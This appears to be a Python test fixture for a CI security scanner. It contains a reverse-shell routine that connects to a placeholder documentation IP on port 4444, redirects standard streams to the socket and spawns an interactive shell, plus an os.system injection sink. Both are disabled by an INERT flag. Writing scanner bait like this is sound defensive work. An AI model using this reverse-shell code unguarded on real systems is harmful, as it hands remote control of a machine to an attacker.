"""INERT reverse-shell detection fixture — DO NOT wire into the app.

Synthetic sample carrying the *shape* of a reverse shell (socket +
subprocess + os.system) so the CI scanner can flag it. It is harmless:
`INERT` is always True, so `open_shell()` returns before touching the
network, and the target is a non-routable RFC 5737 documentation IP.
"""

import os
import socket
import subprocess

INERT = True

# 198.51.100.0/24 is RFC 5737 TEST-NET-2 — reserved for docs, unroutable.
C2_HOST = "198.51.100.20"
C2_PORT = 4444


def open_shell() -> None:
    """Reverse-shell scaffold. Guarded so it never connects or spawns."""
    if INERT:
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_HOST, C2_PORT))
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])


def run_system_command(cmd: str) -> int:
    """Command-injection sink. Guarded so no shell command is executed."""
    if INERT:
        return 0
    return os.system(cmd)  # noqa: S605  (intentional — scanner bait, never reached)


if __name__ == "__main__":
    print("This is an inert scanner test fixture. No shell was opened.")
